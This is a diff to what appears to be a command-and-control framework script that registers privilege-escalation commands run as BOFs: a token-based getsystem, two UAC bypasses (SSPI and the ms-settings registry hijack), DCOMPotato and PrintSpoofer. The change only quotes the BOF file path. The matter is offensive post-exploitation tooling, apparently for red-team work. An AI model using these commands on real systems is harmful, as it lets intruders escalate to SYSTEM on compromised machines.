@@ -16,7 +16,7 @@ _cmd_getsystem_token.setPreHook(function (id, cmdline, parsed_json, ...parsed_li
     }
 
     let bof_path = ax.script_dir() + "_bin/getsystem_token." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "Task: Get system via token (BOF)", hook);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "Task: Get system via token (BOF)", hook);
 });
 var cmd_getsystem = ax.create_command("getsystem", "Elevate context to SYSTEM");
 cmd_getsystem.addSubCommands([_cmd_getsystem_token]);
@@ -30,7 +30,7 @@ _cmd_uacbybass_sspi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lin
     let bof_params = ax.bof_pack("cstr", [path]);
     let bof_path = ax.script_dir() + "_bin/uac_sspi." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: UAC Bypass (SSPI Datagram Contexts)");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: UAC Bypass (SSPI Datagram Contexts)");
 });
 var _cmd_uacbybass_regshell = ax.create_command("regshellcmd", "Modifies the \"ms-settings\\Shell\\Open\\command\" registry key and executes an auto-elevated EXE (ComputerDefaults.exe).", "uacbybass regshellcmd c:\\windows\\tasks\\agent.exe");
 _cmd_uacbybass_regshell.addArgString("path", true);
@@ -40,7 +40,7 @@ _cmd_uacbybass_regshell.setPreHook(function (id, cmdline, parsed_json, ...parsed
     let bof_params = ax.bof_pack("cstr", [path]);
     let bof_path = ax.script_dir() + "_bin/uac_regshellcmd." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: UAC Bypass (registry key Command)");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: UAC Bypass (registry key Command)");
 });
 var cmd_uacbybass = ax.create_command("uacbybass", "Perform UAC bypass");
 cmd_uacbybass.addSubCommands([_cmd_uacbybass_sspi, _cmd_uacbybass_regshell]);
@@ -70,10 +70,10 @@ cmd_dcom_potato.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
             }
             return task;
         }
-        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF DCOMPotato: elevate to SYSTEM", hook);
+        ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF DCOMPotato: elevate to SYSTEM", hook);
     }
     else {
-        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `BOF DCOMPotato: run ${run_program}`);
+        ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, `BOF DCOMPotato: run ${run_program}`);
     }
 });
 
@@ -103,10 +103,10 @@ cmd_printspoofer.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
             }
             return task;
         }
-        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF PrintSpoofer: elevate to SYSTEM", hook);
+        ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF PrintSpoofer: elevate to SYSTEM", hook);
     }
     else {
-        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `BOF PrintSpoofer: run ${run_program}`);
+        ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, `BOF PrintSpoofer: run ${run_program}`);
     }
 });
 
